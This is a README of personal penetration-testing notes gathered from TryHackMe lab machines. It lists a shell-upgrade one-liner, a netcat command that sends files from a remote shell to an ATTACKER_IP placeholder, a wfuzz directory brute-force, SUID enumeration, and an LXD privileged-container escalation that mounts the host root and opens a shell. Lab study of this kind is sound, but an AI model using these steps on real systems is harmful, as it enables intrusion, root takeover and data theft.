# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe platform. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Contents

### Tricks

- Spawn bautiful shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
- File transfer using `nc`:
On the remote shell:
```
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```
On the attacker machine:
```
nc -l ATTACKER_PORT > [output_file_path]
```
- Web exploitation using `wfuzz`:
```
wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
```
- Encoding techniques:
    - [splitbrain](https://www.splitbrain.org/_static/ook/)
    - [hashes](https://hashes.com/en/tools/hash_identifier)
    - [md5hashing](https://md5hashing.net/hash)
    - [cyberchef](https://gchq.github.io/CyberChef/)

### Notes

`xxd`: Read raw file
`l\s`: Equivalent to `ls`
`scp backup.zip toor@192.168.122.30:/home/username_of_remote_host`: copy files to a remote host using ssh
`gzip -d`: Decompress a file

#### Privilege Escalation:
Identify SUID/SGID files:
```
find / -type f -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
LXD container exploitation:
```
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Happy hacking!
